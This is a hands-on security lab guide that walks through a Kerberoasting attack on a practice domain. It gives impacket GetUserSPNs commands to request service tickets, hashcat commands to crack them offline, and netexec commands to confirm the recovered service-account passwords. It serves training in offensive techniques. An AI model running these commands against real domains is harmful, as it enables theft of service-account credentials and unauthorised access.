# Lab 1: Kerberoasting

**Lab Description:** In this lab you will perform a **Kerberoasting** attack against the
`corp.local` domain. Starting from a single low-privileged domain user, you will request
Kerberos service tickets for accounts that have Service Principal Names (SPNs), then crack
those tickets offline to recover the service accounts' plaintext passwords.

**Estimated Duration:** **15 Minutes**

**Learning Objectives:** By the end of this lab, you will be able to:

- Validate domain credentials against a Domain Controller
- Request Kerberos TGS tickets for all SPN-enabled accounts
- Crack the extracted ticket hashes offline with a wordlist
- Confirm the recovered service-account credentials are valid

**Environment / starting position:**

| Item | Value |
|---|---|
| Domain | `corp.local` (DC: `dc1` @ 10.0.1.10) |
| Attacker host | `kali` (tools pre-installed) |
| Starting credential (assume-breach, low-priv user) | `amiller` / `Summer2024` |

---

1. Connect to the **Kali** attacker host over SSH (use the Kali IP / password from the
   **Environment** tab), and confirm you can reach the domain.

    ```bash
    ssh kaliuser@<kali-public-ip>
    nslookup dc1.corp.local
    ```

    **Expected Output:** `dc1.corp.local` resolves to **10.0.1.10**.

1. Validate the low-privileged domain credentials against the Domain Controller using
   **netexec**.

    ```bash
    netexec smb 10.0.1.10 -u amiller -p 'Summer2024'
    ```

    **Expected Output:**

    ```output
    SMB   10.0.1.10   445   DC1   [*] Windows Server 2019 ... (name:DC1) (domain:corp.local)
    SMB   10.0.1.10   445   DC1   [+] corp.local\amiller:Summer2024
    ```

    The `[+]` confirms the credentials are valid on the domain.

1. Request Kerberos service tickets (TGS) for **every account that has an SPN** using
   impacket's **GetUserSPNs** with the `-request` flag. Any authenticated domain user can do
   this — that's what makes Kerberoasting powerful.

    ```bash
    impacket-GetUserSPNs corp.local/amiller:'Summer2024' -dc-ip 10.0.1.10 -request -outputfile /tmp/kerberoast.txt
    ```

    **Expected Output:** a table of SPN-enabled service accounts, and the ticket hashes are
    saved to `/tmp/kerberoast.txt`.

    ```output
    ServicePrincipalName            Name       MemberOf   PasswordLastSet   ...
    ------------------------------  ---------  ---------  ----------------  ...
    MSSQLSvc/sql01.corp.local:1433  svc.sql
    HTTP/web.corp.local             svc.web
    MSSQLSvc/mssql.corp.local:1433  svc.mssql
    HTTP/sccm.corp.local            svc.sccm
    HTTP/intranet.corp.local        svc.iis
    ```

    > **Note (time skew):** if you see `KRB_AP_ERR_SKEW`, sync the clock and retry:
    > `sudo systemctl restart systemd-timesyncd && sleep 5`

1. Prepare the **rockyou** wordlist (installed with the `wordlists` package; it ships
   gzip-compressed).

    ```bash
    sudo apt-get install -y wordlists
    sudo gunzip -kf /usr/share/wordlists/rockyou.txt.gz
    ls -lh /usr/share/wordlists/rockyou.txt
    ```

1. Crack the extracted ticket hashes offline with **hashcat** (mode `13100` = Kerberos 5
   TGS-REP RC4).

    ```bash
    hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
    ```

    Then show the cracked results:

    ```bash
    hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --show
    ```

    **Expected Output:** one or more service accounts crack — e.g. `svc.web` recovers to
    **`Password1`** (others such as `svc.mssql`, `svc.sccm`, `svc.sql` may also crack):

    ```output
    $krb5tgs$23$*svc.web$CORP.LOCAL$...:Password1
    ```

1. Confirm the recovered service-account credential is valid on the domain (here against the
   MSSQL server).

    ```bash
    netexec smb 10.0.1.20 -u svc.web -p 'Password1'
    ```

    **Expected Output:**

    ```output
    SMB   10.0.1.20   445   MSSQL   [+] corp.local\svc.web:Password1
    ```

**Lab 1 Recap:** In this lab, you:

- Validated a low-privileged domain credential against the DC with `netexec`.
- Requested TGS tickets for all SPN-enabled service accounts with `GetUserSPNs`.
- Cracked the ticket hashes offline with `hashcat` + `rockyou`, recovering plaintext
  service-account passwords.
- Confirmed a recovered credential works on the domain.

This proves the domain's **weak service-account passwords + Kerberoastable SPNs** are
exploitable exactly as designed.

## You have successfully completed Lab 1.

Now, click on **Next** from the lower right corner to move on to the next lab.
